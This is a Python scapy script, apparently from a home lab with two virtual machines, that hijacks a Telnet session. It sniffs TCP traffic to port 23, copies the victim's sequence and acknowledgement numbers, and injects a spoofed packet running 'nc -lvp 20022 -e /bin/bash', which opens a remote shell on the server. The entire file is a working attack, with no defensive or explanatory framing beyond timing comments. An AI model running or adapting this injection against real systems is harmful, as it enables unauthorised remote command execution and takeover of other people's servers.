from scapy.all import *
from scapy.layers.inet import IP, TCP

from aux_function import pkt_to_json

count = 0
server_host = '192.168.1.70'
server_port = 23  # Your victim's server's port
victim_host = '192.168.1.67'
victim_port = None

# VM_A_IP = '192.168.1.67'
# VM_B_IP = '192.168.1.70'
# VM_A_MAC = '80:61:5f:0e:7d:ee'
# VM_B_MAC = '08:00:27:14:ac:04'


prev_client_load = None


def packet_listen_callback(pkt):
    global count, server_host, server_port, victim_host, victim_port, prev_client_load
    count += 1
    print("---------------- " + str(count) + " ------------------")
    real_packet = pkt_to_json(pkt.show(dump=True))
    print('seq: ' + real_packet['tcp']['seq'])
    print('ack: ' + real_packet['tcp']['ack'])
    print('flg: ' + real_packet['tcp']['flags'])
    print('prv: ' + str(prev_client_load))
    if real_packet['ip']['dst'] == server_host:
        if victim_host is None or victim_port is None:
            # Save victim info so we can use later to craft our message
            victim_host = real_packet['ip']['src']
            victim_port = int(real_packet['tcp']['sport'])
        print("TO host\t" + real_packet['ip']['dst'])
        # We wait for "A" flag - when user has acknowledged a response from the server.
        # Can just send new message here with the same seq and ack code.
        # We also want to ensure that we are waiting for the command to be executed
        # only after the last command by the user has been executed.
        # Therefore we wait for the last known payload to be '\r\n'.

        if prev_client_load is not None and '\\r\\n' in prev_client_load and real_packet['tcp']['flags'] == 'A':
            data = "nc -lvp 20022 -e /bin/bash\r\n"  # The command we'll be sending
            seq = int(real_packet['tcp']['seq'])
            ack = int(real_packet['tcp']['ack'])
            print("------------- SENDING ---------------")
            print("Sending " + data, flush=True)

            ip = IP(src=victim_host, dst=server_host)
            # Send with PA flag - 'please ack'. But we don't need to care about result.
            tcp = TCP(sport=victim_port, dport=server_port, flags="PA", seq=seq, ack=ack)
            pkt = ip / tcp / data
            send(pkt, verbose=0)

        # To server - not part of the scope but we can listen to raw data sent
        if 'raw' in real_packet:
            print('dat: ' + real_packet['raw']['load'])
            # Update previous payload for next packet
            prev_client_load = real_packet['raw']['load']
    else:
        print("FROM server\t" + real_packet['ip']['src'])
        if 'raw' in real_packet:
            print('dat: ' + real_packet['raw']['load'])


sniff(filter="tcp and host " + server_host + " and tcp port " + str(server_port), prn=packet_listen_callback)

# Article at https://zya.page.link/tcpjack
